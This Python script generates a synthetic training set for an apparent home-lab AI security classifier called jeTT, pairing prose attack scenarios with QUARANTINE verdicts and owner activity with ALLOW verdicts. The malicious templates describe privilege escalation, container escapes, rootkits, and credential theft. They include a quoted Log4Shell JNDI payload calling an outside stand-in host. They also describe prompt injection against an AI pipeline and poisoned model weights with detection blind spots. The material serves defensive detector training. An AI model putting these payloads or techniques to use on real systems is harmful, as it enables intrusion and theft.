import json
import random

# ============================================================
# jeTT EXTENDED TRAINING DATASET — VOLUME 2
# Advanced, Environment-Specific, and Novel Attack Patterns
# ============================================================

extended_malicious = [

    # --- RCE & INJECTION ---
    {
        "name": "Log4Shell JNDI Injection",
        "step_x": "Web server received HTTP request containing ${jndi:ldap://external.host/exploit} in User-Agent header.",
        "step_y": "Log4j library parsed the JNDI string and initiated outbound LDAP connection to attacker server.",
        "step_z": "Attacker LDAP server responded with malicious Java class that executed on the victim system.",
        "prediction": "Log4Shell RCE exploitation. JNDI lookup in log data triggers remote class loading. Full code execution achieved through logging library. One of the most critical CVEs in history.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Server Side Template Injection",
        "step_x": "Web application received input containing template syntax like {{7*7}} or ${7*7}.",
        "step_y": "Application template engine evaluated the expression and returned computed result.",
        "step_z": "Attacker escalated to OS command execution via template engine sandbox escape.",
        "prediction": "SSTI leading to RCE. Template engines with user input are critically dangerous. Sandbox escape gives full system access through web application context.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Deserialization Attack",
        "step_x": "Application received serialized Java or Python object data from untrusted network source.",
        "step_y": "Application deserialized the object without validation triggering gadget chain execution.",
        "step_z": "Gadget chain executed OS commands spawning reverse shell process.",
        "prediction": "Insecure deserialization RCE. Attacker crafted malicious serialized object to exploit deserialization gadget chains. Critical vulnerability class allowing arbitrary code execution.",
        "verdict": "QUARANTINE_PID"
    },

    # --- KERNEL EXPLOITS ---
    {
        "name": "Dirty COW Exploitation",
        "step_x": "Process opened read-only memory mapped file using mmap with MAP_PRIVATE flag.",
        "step_y": "Race condition exploited between write and madvise calls to bypass copy-on-write protection.",
        "step_z": "Read-only root-owned file modified giving attacker write access to /etc/passwd.",
        "prediction": "Dirty COW kernel race condition exploit. Bypasses kernel memory protection to modify read-only files. Commonly used to add root user to /etc/passwd for persistent privileged access.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "PwnKit Polkit Escalation",
        "step_x": "Process executed pkexec binary which is installed setuid root on the system.",
        "step_y": "Crafted environment variables triggered out-of-bounds write in pkexec argument processing.",
        "step_z": "pkexec spawned shell with root privileges bypassing all authentication checks.",
        "prediction": "PwnKit CVE-2021-4034 polkit privilege escalation. Present on virtually all Linux systems. Setuid pkexec binary exploited to gain instant root without any password.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Dirty Pipe Exploitation",
        "step_x": "Process created pipe and used splice to reference read-only file data.",
        "step_y": "PIPE_BUF_FLAG_CAN_MERGE flag exploited to overwrite page cache of read-only file.",
        "step_z": "Read-only SUID binary overwritten in memory allowing arbitrary code execution as root.",
        "prediction": "Dirty Pipe CVE-2022-0847 kernel exploit. Overwrites read-only files via pipe page cache manipulation. Can overwrite SUID binaries to gain instant root privileges.",
        "verdict": "QUARANTINE_PID"
    },

    # --- LIBRARY HIJACKING ---
    {
        "name": "LD_PRELOAD Hijacking",
        "step_x": "Process set LD_PRELOAD environment variable to point to malicious shared library in /tmp/",
        "step_y": "Target binary loaded and executed with the malicious library preloaded before system libraries.",
        "step_z": "Preloaded library hooked libc functions intercepting all system calls and credentials.",
        "prediction": "LD_PRELOAD injection for function hooking. Malicious library loaded before legitimate ones intercepts all function calls. Used for credential theft, syscall hiding, and persistence.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Symlink Race Attack",
        "step_x": "Process created symlink in /tmp/ pointing to sensitive system file during privileged operation window.",
        "step_y": "Privileged process followed symlink believing it was operating on intended file.",
        "step_z": "Privileged write operation modified /etc/shadow through the symlink giving attacker password access.",
        "prediction": "TOCTOU symlink race condition attack. Timing window between file check and use exploited via symlink swap. Privileged process manipulated to write attacker-controlled content to sensitive files.",
        "verdict": "QUARANTINE_PID"
    },

    # --- CONTAINER ESCAPES ---
    {
        "name": "Cgroup v1 Container Escape",
        "step_x": "Container process mounted cgroup v1 filesystem and gained write access to release_agent.",
        "step_y": "release_agent configured to execute script on host system when cgroup is empty.",
        "step_z": "Container triggered release_agent execution achieving arbitrary code execution on host.",
        "prediction": "Cgroup v1 release_agent container escape. Privileged container with cgroup mount can execute arbitrary commands on host system. Complete container isolation broken.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Docker Socket Escape",
        "step_x": "Container process discovered /var/run/docker.sock mounted inside container.",
        "step_y": "Container used Docker socket to spawn new privileged container with host filesystem mounted.",
        "step_z": "New container written crontab to host filesystem establishing persistent root access.",
        "prediction": "Docker socket escape. Exposed Docker socket gives container full control over host Docker daemon. Trivial to escape container and compromise host when socket is mounted.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Namespace Escape",
        "step_x": "Container process called unshare to create new user namespace with uid mapping.",
        "step_y": "New namespace allowed process to appear as root inside namespace while retaining host privileges.",
        "step_z": "Process leveraged namespace capabilities to access host resources outside container boundaries.",
        "prediction": "Linux namespace escape via user namespace privilege escalation. Misconfigured namespace permissions allow container breakout and host system access.",
        "verdict": "QUARANTINE_PID"
    },

    # --- EBPF ABUSE ---
    {
        "name": "eBPF Rootkit Installation",
        "step_x": "Process with CAP_SYS_ADMIN or CAP_BPF loaded malicious eBPF program into kernel.",
        "step_y": "eBPF program attached to syscall tracepoints intercepting and modifying system call arguments.",
        "step_z": "eBPF program hiding specific PIDs, files, and network connections from all userspace tools.",
        "prediction": "eBPF rootkit. Attacker using legitimate kernel feature for malicious hiding. eBPF programs run in kernel space with near-impossible detection from userspace. Only kernel-level analysis reveals it.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "eBPF Credential Theft",
        "step_x": "Malicious eBPF program loaded and attached to sys_read syscall tracepoint.",
        "step_y": "eBPF program intercepting all read calls on SSH and sudo processes capturing passwords.",
        "step_z": "Captured credentials written to ring buffer and exfiltrated via covert channel.",
        "prediction": "eBPF keylogger targeting authentication processes. Intercepts plaintext passwords before encryption at the syscall level. Completely invisible to traditional security tools.",
        "verdict": "QUARANTINE_PID"
    },

    # --- NETWORK ATTACKS ON GOWSKINET ---
    {
        "name": "ARP Spoofing on GowskiNet",
        "step_x": "Process sent gratuitous ARP replies claiming 192.168.0.1 router MAC address on GowskiNet.",
        "step_y": "Other hosts on 192.168.0.0/24 updated ARP cache directing traffic through attacker machine.",
        "step_z": "Attacker performing man-in-the-middle interception of all GowskiNet traffic including credentials.",
        "prediction": "ARP spoofing MITM attack on GowskiNet. Attacker impersonating router to intercept all network traffic. All unencrypted credentials and data on the network now compromised.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "MQTT Broker Hijacking",
        "step_x": "Unauthorized client connected to Mosquitto MQTT broker on GowskiNet without authentication.",
        "step_y": "Client subscribed to all topics using wildcard # gaining visibility into all IoT messages.",
        "step_z": "Client published malicious commands to GNI skull and sensor topic channels.",
        "prediction": "MQTT broker compromise. Unauthenticated MQTT access exposes all IoT device communications. Publishing to command topics allows attacker to control GNI animatronic and sensor systems.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Rogue DHCP Server",
        "step_x": "Unknown process started DHCP server on GowskiNet responding to client discovery packets.",
        "step_y": "Rogue DHCP assigned attacker-controlled DNS server to new network clients.",
        "step_z": "Clients using attacker DNS received malicious responses redirecting banking and email traffic.",
        "prediction": "Rogue DHCP DNS hijacking. Attacker's DHCP server redirects DNS to malicious resolver. All DNS queries from new clients poisoned enabling phishing and credential theft at network level.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "WiFi Evil Twin Attack",
        "step_x": "High power WiFi access point created with same SSID as legitimate GowskiNet network.",
        "step_y": "Deauth packets sent to disconnect clients from legitimate AP forcing reconnection to evil twin.",
        "step_z": "Clients connected to evil twin with all traffic intercepted and credentials captured.",
        "prediction": "Evil twin WiFi attack. Rogue AP with matching SSID and stronger signal captures clients. All WiFi traffic including HTTPS via SSL stripping now visible to attacker.",
        "verdict": "QUARANTINE_PID"
    },

    # --- HARDWARE SPECIFIC ATTACKS ---
    {
        "name": "ESP32 Exploitation",
        "step_x": "ESP32 device on GowskiNet received crafted packet exploiting buffer overflow in firmware.",
        "step_y": "Overflow corrupted firmware execution flow allowing arbitrary code execution on microcontroller.",
        "step_z": "Compromised ESP32 began scanning local network and reporting back to attacker C2.",
        "prediction": "ESP32 firmware exploitation. IoT device compromise provides persistent network foothold. Microcontrollers often have no security monitoring making them ideal attacker pivot points.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "USB Rubber Ducky on ttyACM",
        "step_x": "New USB HID device appeared on /dev/ttyACM presenting as keyboard to system.",
        "step_y": "Device injected rapid keystroke sequence executing terminal commands within seconds.",
        "step_z": "Injected commands downloaded and executed payload, added persistence, opened reverse shell.",
        "prediction": "USB Rubber Ducky HID attack. Malicious USB device emulates keyboard to inject pre-programmed attack sequence. Bypasses all software security as OS trusts keyboard input implicitly.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Flipper Zero Attack Signature",
        "step_x": "Unknown device transmitted subGHz signals attempting to replay garage/IoT device commands.",
        "step_y": "RFID/NFC emulation detected attempting to clone access credentials from nearby cards.",
        "step_z": "BadUSB payload injected via Flipper Zero USB connection to target machine.",
        "prediction": "Flipper Zero multi-vector attack. Device capable of subGHz replay, RFID cloning, and BadUSB simultaneously. Physical proximity attack requiring immediate investigation of nearby individuals.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Bambu Printer Network Exploit",
        "step_x": "Unauthorized connection made to Bambu A1 printer on local network via MQTT port 8883.",
        "step_y": "Attacker gained access to printer control interface and print job management.",
        "step_z": "Attacker used printer network access to pivot to other devices on GowskiNet.",
        "prediction": "IoT printer exploitation used as network pivot point. Smart printers often have weak security and network access making them ideal lateral movement targets on home networks.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Govee API Key Theft",
        "step_x": "Unknown process read bash history file containing Govee API key from previous curl commands.",
        "step_y": "API key exfiltrated to external server giving attacker control of smart home devices.",
        "step_z": "Attacker using Govee API to track home occupancy patterns via light usage data.",
        "prediction": "Smart home credential theft via bash history. API keys in shell history are frequently targeted. Govee access enables physical security reconnaissance — attacker can determine when home is occupied.",
        "verdict": "QUARANTINE_PID"
    },

    # --- AI & OLLAMA SPECIFIC ---
    {
        "name": "Ollama API Unauthorized Access",
        "step_x": "External process connected to Ollama API on port 11434 from non-localhost address.",
        "step_y": "Unauthorized client sent requests to load and run arbitrary models from HuggingFace.",
        "step_z": "Malicious model loaded containing embedded code that executed on the host system.",
        "prediction": "Ollama API exposure and model poisoning. Ollama bound to all interfaces allows remote model execution. Malicious GGUF models can contain embedded exploits that execute during loading.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Prompt Injection Attack",
        "step_x": "Malicious input containing instruction override text fed into AI system processing pipeline.",
        "step_y": "AI model followed injected instructions ignoring original system prompt and security context.",
        "step_z": "AI system executed attacker instructions including revealing system information and bypassing filters.",
        "prediction": "Prompt injection attack against AI pipeline. Injected instructions override system prompt causing AI to act as attacker's agent. Critical risk when AI processes untrusted external data.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Model Weight Poisoning",
        "step_x": "Unknown process modified GGUF model file in models directory without user interaction.",
        "step_y": "Modified model file hash does not match original download checksum.",
        "step_z": "Tampered model produces subtly incorrect security verdicts consistently missing specific attack patterns.",
        "prediction": "AI model weight poisoning attack. Attacker modified model weights to create security blind spots. Poisoned model appears functional but systematically fails to detect specific threats the attacker will use.",
        "verdict": "QUARANTINE_PID"
    },

    # --- MONITORING STACK ATTACKS ---
    {
        "name": "Grafana Unauthorized Access",
        "step_x": "External connection attempted to Grafana on port 3000 using default admin credentials.",
        "step_y": "Successful login to Grafana dashboard exposing full GowskiNet infrastructure metrics.",
        "step_z": "Attacker used Grafana API to extract network topology, host IPs, and service information.",
        "prediction": "Grafana credential attack and infrastructure reconnaissance. Default credentials expose monitoring stack. Full network map including all GowskiNet hosts and services now in attacker's hands.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Prometheus Metrics Scraping",
        "step_x": "Unauthorized external client connected to Prometheus on port 9090.",
        "step_y": "Client queried all metrics endpoints extracting detailed system performance and process data.",
        "step_z": "Extracted metrics used to identify running services, resource usage patterns, and attack timing.",
        "prediction": "Prometheus metrics exfiltration. Monitoring endpoints expose detailed system internals. Attacker uses performance metrics to identify optimal attack timing and vulnerable services.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Portainer API Abuse",
        "step_x": "Unauthorized connection to Portainer on port 9443 using brute forced credentials.",
        "step_y": "Attacker gained Portainer admin access with full Docker management capabilities.",
        "step_z": "Attacker deployed new privileged container with host filesystem mounted for complete system access.",
        "prediction": "Portainer admin compromise leading to full host takeover. Docker management UI with admin access gives attacker complete control over all containers and host system via privileged container deployment.",
        "verdict": "QUARANTINE_PID"
    },

    # --- FORENSIC EVASION ---
    {
        "name": "Timestomping",
        "step_x": "Process used utimensat or touch command to modify file access and modification timestamps.",
        "step_y": "Malicious files given timestamps matching legitimate system files to blend in.",
        "step_z": "Forensic timeline analysis now unable to identify when malicious files were created.",
        "prediction": "Timestomping anti-forensics technique. Attacker manipulating file metadata to evade timeline-based detection. All file timestamp evidence for incident response now corrupted.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Systemd Journal Corruption",
        "step_x": "Process wrote malformed data to systemd journal socket corrupting log entries.",
        "step_y": "Journal corruption caused gaps in system event logging hiding attacker activity window.",
        "step_z": "Specific time ranges of logs became unreadable destroying evidence of initial compromise.",
        "prediction": "Systemd journal tampering for evidence destruction. Corrupting journal creates blind spots in system event history. Incident responders cannot reconstruct attack timeline.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Memory Only Execution",
        "step_x": "Process used memfd_create to create anonymous memory file descriptor not backed by filesystem.",
        "step_y": "Malicious ELF binary written directly to memory file descriptor and executed via /proc/self/fd/",
        "step_z": "Entire attack executed in memory with zero disk writes leaving no traditional forensic artifacts.",
        "prediction": "Fileless memory-only malware execution. memfd_create creates file descriptor with no filesystem entry. Binary executes entirely in RAM leaving no traces on disk. Only memory forensics or eBPF can detect.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Steganography C2",
        "step_x": "Process downloaded seemingly normal image files from external web server.",
        "step_y": "Process extracted hidden data from image least significant bits using steganography decoder.",
        "step_z": "Extracted data contained C2 commands that process executed on the system.",
        "prediction": "Steganographic covert C2 channel. Commands hidden in innocent-looking image files evade content inspection. Traffic appears as normal web browsing making detection extremely difficult.",
        "verdict": "QUARANTINE_PID"
    },

    # --- WIREGUARD & VPN ATTACKS ---
    {
        "name": "WireGuard Config Theft",
        "step_x": "Unknown process read WireGuard configuration files containing private keys from /etc/wireguard/",
        "step_y": "Private key and peer configuration exfiltrated allowing attacker to impersonate the VPN endpoint.",
        "step_z": "Attacker used stolen config to establish unauthorized VPN tunnel into protected network segment.",
        "prediction": "WireGuard private key theft. Stolen private key allows complete VPN impersonation. Attacker gains authenticated access to all VPN-protected network segments as if they were the legitimate user.",
        "verdict": "QUARANTINE_PID"
    },

    # --- COWRIE PIVOT ATTACKS ---
    {
        "name": "Cowrie to Real System Pivot",
        "step_x": "Attacker connected to Cowrie honeypot on port 2222 and conducted reconnaissance.",
        "step_y": "Attacker discovered real system services by probing honeypot network interface addresses.",
        "step_z": "Attacker pivoted from honeypot network to real system services bypassing honeypot isolation.",
        "prediction": "Honeypot pivot attack. Sophisticated attacker using honeypot as launching point to attack real infrastructure. Honeypot network isolation failure allows access to legitimate GowskiNet services.",
        "verdict": "QUARANTINE_PID"
    },

    # --- LORA MESH ATTACKS ---
    {
        "name": "LoRa Mesh Poisoning",
        "step_x": "Unknown LoRa node joined GowskiNet Meshtastic mesh broadcasting false node identity.",
        "step_y": "Rogue node replayed captured GPS packets with modified coordinates injecting false location data.",
        "step_z": "Rogue node began intercepting and modifying mesh messages between legitimate nodes.",
        "prediction": "LoRa mesh network poisoning. Rogue Meshtastic node infiltrating private mesh network. False GPS data corrupts location tracking. Message interception compromises mesh communication integrity.",
        "verdict": "QUARANTINE_PID"
    },

    # --- SUPPLY CHAIN & PACKAGE ATTACKS ---
    {
        "name": "Cargo Dependency Confusion",
        "step_x": "cargo build downloaded package with same name as internal tool from public crates.io registry.",
        "step_y": "Public package version number higher than internal package causing automatic selection.",
        "step_z": "Malicious public package build script executed during compilation stealing environment variables.",
        "prediction": "Dependency confusion supply chain attack targeting Rust build system. Public package with higher version number than internal package automatically selected. Build-time code execution steals secrets from build environment.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Git Submodule Attack",
        "step_x": "Git repository submodule URL changed to point to attacker-controlled repository.",
        "step_y": "git submodule update fetched malicious code from attacker repository.",
        "step_z": "Malicious submodule post-checkout hook executed attacker payload on developer machine.",
        "prediction": "Git submodule hijacking supply chain attack. Compromised submodule URL delivers malicious code to all developers who update. Post-checkout hooks execute automatically without developer awareness.",
        "verdict": "QUARANTINE_PID"
    },

    # --- ADVANCED PERSISTENT THREAT PATTERNS ---
    {
        "name": "Living Memory Persistence",
        "step_x": "Malware injected code into long-running legitimate process that survives reboots via systemd.",
        "step_y": "Injected code established persistence by writing to /proc/PID/mem of systemd managed service.",
        "step_z": "Malware survives reboots because legitimate service restarts automatically carrying injected code.",
        "prediction": "In-memory persistence via legitimate service injection. Malware persists without any files on disk by living inside legitimate service process memory. Survives reboots as service restarts with injected code intact.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Scheduled Task Masquerade",
        "step_x": "New systemd timer created with name mimicking legitimate system maintenance task.",
        "step_y": "Timer configured to execute payload at intervals matching legitimate maintenance windows.",
        "step_z": "Payload executed during maintenance window to blend with expected system activity.",
        "prediction": "Scheduled task masquerading as legitimate maintenance. Attacker timing malicious execution to coincide with normal maintenance windows. Activity appears legitimate in logs without careful baseline analysis.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Kernel Thread Masquerade",
        "step_x": "Malicious process created with name in brackets like [kworker/0:1] mimicking kernel thread.",
        "step_y": "Process ran with low priority and minimal CPU to avoid detection by performance monitoring.",
        "step_z": "Process maintained persistent C2 connection disguised as kernel thread in process listings.",
        "prediction": "Kernel thread name masquerading. Brackets around process name makes it appear as kernel thread in ps output. Low resource usage avoids alerting performance monitoring. Most users never investigate kernel threads.",
        "verdict": "QUARANTINE_PID"
    },

    # --- NOVEL REASONING EXAMPLES ---
    {
        "name": "Compiler as Weapon",
        "step_x": "gcc or rustc invoked by non-developer process to compile source code in /tmp/",
        "step_y": "Compilation succeeded producing custom binary tailored to specific target system architecture.",
        "step_z": "Custom compiled binary executed with capabilities specifically designed to evade known signatures.",
        "prediction": "On-target compilation to evade signature detection. Attacker compiles malware on victim machine ensuring it matches exact kernel version and architecture. Custom binary has no known signature hash making traditional AV blind.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Protocol Abuse Chain",
        "step_x": "Process used legitimate netcat or socat for data transfer disguised as network diagnostic.",
        "step_y": "Data transfer established persistent bidirectional channel on allowed firewall port like 80 or 443.",
        "step_z": "Channel used for interactive command execution tunneled through allowed protocol.",
        "prediction": "Protocol tunneling using legitimate network tools. Netcat/socat on allowed ports bypasses firewall rules. Bidirectional channel gives full remote access that appears as legitimate web traffic.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Predictive Attack Reasoning",
        "step_x": "Reconnaissance: Process read /proc/net/tcp mapping all listening services and connections.",
        "step_y": "Enumeration: Process read /etc/passwd and checked sudo configuration for privilege paths.",
        "step_z": "Staging: Process downloaded tools to /tmp/ matching identified vulnerable service versions.",
        "prediction": "Full attack kill chain in progress. Recon phase identified targets, enumeration found privilege path, staging downloaded specific exploit tools. Imminent exploitation attempt. Quarantine immediately before execution phase.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Anti-Analysis Behavior",
        "step_x": "Process checked for VM artifacts including /proc/scsi/scsi VMware strings and CPUID hypervisor bit.",
        "step_y": "Process detected sandbox environment and entered dormant state doing nothing for 10 minutes.",
        "step_z": "After timeout process resumed malicious activity believing automated analysis window had passed.",
        "prediction": "Sandbox-aware malware with anti-analysis behavior. Detects analysis environment and delays execution. The dormancy itself is the detection signal — legitimate software does not check for VMs then pause.",
        "verdict": "QUARANTINE_PID"
    },
    {
        "name": "Hardware Fingerprinting Exfil",
        "step_x": "Process read CPU serial, MAC addresses, disk serials and motherboard UUID from /sys and /proc",
        "step_y": "Process collected installed software list, kernel version, and user account details.",
        "step_z": "Fingerprint data exfiltrated to C2 for target identification and exploit selection.",
        "prediction": "System fingerprinting for targeted attack preparation. Attacker building precise target profile to select most effective exploits. Data exfiltration precedes tailored follow-up attack optimized for this specific hardware.",
        "verdict": "QUARANTINE_PID"
    },
]

# ============================================================
# EXTENDED BENIGN — MORE GOWSKINET SPECIFIC
# ============================================================
extended_benign = [
    {
        "step_x": "jeTT Rust binary loaded IBM Granite 3.3 2B GGUF model into CUDA VRAM.",
        "step_y": "jeTT initialized three inference modes: Guard 10 tokens, Alert 30 tokens, Query 2048 tokens.",
        "step_z": "jeTT standing by on RTX 3060 GPU awaiting eBPF telemetry from kernel sensor.",
        "prediction": "Normal jeTT autonomous security AI startup sequence. This is the security system itself initializing. Always allow — jeTT is the defender.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "Cerberus eBPF kernel sensor compiled and loaded into kernel via libbpf.",
        "step_y": "Cerberus attached tracepoint to execve syscall monitoring all process executions.",
        "step_z": "Cerberus ring buffer initialized sending telemetry to Rust agent for jeTT analysis.",
        "prediction": "Normal Cerberus XDR kernel sensor startup. Part of GowskiNet security stack alongside jeTT. eBPF attachment to execve is the intended monitoring function.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "WireGuard VPN interface wg0 brought up with configuration from /etc/wireguard/wg0.conf.",
        "step_y": "VPN tunnel established to peer using Joseph's legitimate keypair.",
        "step_z": "Encrypted tunnel active for secure remote access to GowskiNet from external location.",
        "prediction": "Legitimate WireGuard VPN tunnel establishment by system owner. Known configuration file, expected keypair usage, normal remote access pattern for security researcher.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "YubiKey 5C NFC inserted on USB, recognized as FIDO2 authenticator device.",
        "step_y": "Browser or SSH requested FIDO2 challenge response for two-factor authentication.",
        "step_z": "YubiKey provided signed challenge response completing authentication successfully.",
        "prediction": "Normal YubiKey FIDO2 hardware authentication. Joseph using hardware security key for 2FA. Expected security-conscious behavior from GowskiNet owner.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "GPG process started to sign git commit in ~/Projects/ using key D21582F480C792442181141349B1FAC76EEE64BB.",
        "step_y": "GPG unlocked private key using stored passphrase for automated commit signing.",
        "step_z": "Git commit signed and pushed to GitHub with verified signature.",
        "prediction": "Normal GPG signed git commit workflow. Joseph signs all commits for code authenticity verification. Known GPG key fingerprint, legitimate repository path.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "Cowrie honeypot received SSH brute force attack on port 2222 from external IP.",
        "step_y": "Cowrie logged attacker commands and captured uploaded malware samples.",
        "step_z": "Cowrie data written to log files for parser.js and Bifrost analysis pipeline.",
        "prediction": "Normal GowskiNet honeypot operation. Attacks on port 2222 are intentional and expected. Cowrie is designed to receive these attacks for security research. Do not flag honeypot attack traffic.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "RTL-SDR device opened by gqrx or rtl_tcp for radio frequency monitoring.",
        "step_y": "SDR scanning 433MHz and 915MHz bands for IoT device transmissions.",
        "step_z": "RF data logged for analysis of local wireless device landscape.",
        "prediction": "Normal RTL-SDR radio monitoring by Joseph for security research and spectrum analysis. Expected hardware usage for GowskiNet RF security research.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "Meshtastic GPS logger polling Heltec LoRa V4 board on /dev/ttyACM0 every 10 seconds.",
        "step_y": "Script parsing GPS coordinates from d9b0 mobile node broadcasting from car dashboard.",
        "step_z": "Coordinates reverse geocoded via OpenStreetMap and logged with speed and heading data.",
        "prediction": "Normal Cerberus/jeTT GPS range testing operation. Joseph conducting LoRa range tests while driving. Serial port access to /dev/ttyACM0 is expected for Meshtastic board communication.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "esptool.py connected to ESP32 on /dev/ttyACM0 for firmware flashing operation.",
        "step_y": "Firmware binary verified against checksum before writing to ESP32 flash memory.",
        "step_z": "ESP32 rebooted successfully running new Meshtastic or custom firmware.",
        "prediction": "Normal ESP32 firmware development by Joseph. Known tool, known device, legitimate hardware development workflow for GowskiNet IoT projects.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "GNI skull script ~/Scripts/gni/gni.py started reading from ~/.gni_config for API credentials.",
        "step_y": "Script connected to Claude API for animatronic skull AI response generation.",
        "step_z": "Servo motors and NeoPixel eyes activated based on Claude API response.",
        "prediction": "Normal GNI animatronic skull operation. Joseph's T-800 skull project using Claude API for responses. Known script path, known config file, expected API usage.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "GodsApp GTK4 security orchestrator launched from applications menu by cosmic user.",
        "step_y": "GodsApp loading 17-tool security catalog including Metasploit and theHarvester.",
        "step_z": "Security tools executed within GodsApp embedded terminal for authorized testing.",
        "prediction": "Normal GodsApp v0.6.0 Olympus security orchestrator usage by Joseph. Legitimate security research tool built by system owner for authorized penetration testing.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "Meli honeypot dashboard React frontend connecting to FastAPI backend on local network.",
        "step_y": "Dashboard displaying real-time attack data from Cowrie, Dionaea, and Heralding honeypots.",
        "step_z": "Honeypot metrics aggregated and displayed for security research analysis.",
        "prediction": "Normal Meli honeypot command center operation. Joseph monitoring GowskiNet honeypot infrastructure through his custom dashboard.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "NyXxOS ISO build process started using archiso in ~/NyX-OS-Package/ directory.",
        "step_y": "Build process compiling custom packages and applying NyXxOS Hyprland configuration.",
        "step_z": "ISO written to output directory with zstd level 19 compression.",
        "prediction": "Normal NyXxOS custom Linux distribution build by Joseph. Known build directory, expected archiso usage, legitimate OS development workflow.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "daily_report.sh executed by cron at 6AM generating GowskiNet security summary.",
        "step_y": "Script aggregated honeypot statistics, attack counts, and top attacker IPs from logs.",
        "step_z": "Daily report written to file and available via Bifrost dashboard.",
        "prediction": "Normal scheduled GowskiNet daily security report generation. Known cron job at known time, known script in ~/Scripts/deployed/, expected automated operation.",
        "verdict": "ALLOW"
    },
    {
        "step_x": "Flipper Zero connected via USB in normal operation mode for firmware or data management.",
        "step_y": "qFlipper application opened to manage Flipper Zero files and firmware updates.",
        "step_z": "Momentum firmware MNTM-012 updated or SubGHz captures reviewed.",
        "prediction": "Normal Flipper Zero management by Joseph. Expected USB connection for device management. Flipper Zero is legitimate security research tool owned by system user.",
        "verdict": "ALLOW"
    },
]

# ============================================================
# GENERATE DATASET
# ============================================================
def generate_extended(count=4000):
    dataset = []

    mal_count = int(count * 0.50)
    for _ in range(mal_count):
        t = random.choice(extended_malicious)
        pid = random.randint(1000, 65535)
        uid = random.choice([0, 1000, 33, 999, 65534])
        time_str = f"{random.randint(0,23):02d}:{random.randint(0,59):02d}"
        dataset.append({
            "instruction": "You are jeTT, autonomous AI Anti-Virus & Security for Joseph Sierengowski's GowskiNet lab. Analyze these sequential system events. Think like an attacker to understand intent. Think like a defender to stop them. Output your analysis and strict security verdict.",
            "input": f"Time: {time_str} | UID: {uid}\nStep 1: {t['step_x']}\nStep 2: {t['step_y']}\nStep 3: {t['step_z']}",
            "output": f"Analysis Matrix:\n- Technique: {t['name']}\n- Attacker Intent: {t['prediction']}\n- Confidence: HIGH\nFinal Verdict: {t['verdict']}_{pid}"
        })

    ben_count = int(count * 0.50)
    for _ in range(ben_count):
        b = random.choice(extended_benign)
        dataset.append({
            "instruction": "You are jeTT, autonomous AI Anti-Virus & Security for Joseph Sierengowski's GowskiNet lab. Analyze these sequential system events. Think like an attacker to understand intent. Think like a defender to stop them. Output your analysis and strict security verdict.",
            "input": f"Step 1: {b['step_x']}\nStep 2: {b['step_y']}\nStep 3: {b['step_z']}",
            "output": f"Analysis Matrix:\n- Technique: Known GowskiNet legitimate operation.\n- Behavioral Assessment: {b['prediction']}\n- Confidence: HIGH\nFinal Verdict: {b['verdict']}"
        })

    random.shuffle(dataset)
    return dataset

print("[*] Generating jeTT extended training dataset...")
data = generate_extended(4000)

with open("jett_extended_training.json", "w") as f:
    json.dump(data, f, indent=2)

# Merge with existing if it exists
try:
    with open("jett_training_data.json", "r") as f:
        existing = json.load(f)
    merged = existing + data
    random.shuffle(merged)
    with open("jett_training_data_full.json", "w") as f:
        json.dump(merged, f, indent=2)
    print(f"[+] Extended dataset: {len(data)} examples")
    print(f"[+] Merged with existing: {len(merged)} total examples")
    print(f"[+] Saved to jett_training_data_full.json")
except FileNotFoundError:
    print(f"[+] Generated {len(data)} examples")
    print(f"[+] Saved to jett_extended_training.json")

malicious = sum(1 for d in data if "QUARANTINE" in d["output"])
benign = sum(1 for d in data if "ALLOW" in d["output"] and "QUARANTINE" not in d["output"])
print(f"\n    Malicious: {malicious}")
print(f"    Benign:    {benign}")
print(f"\n[+] jeTT now knows everything it needs to protect GowskiNet")
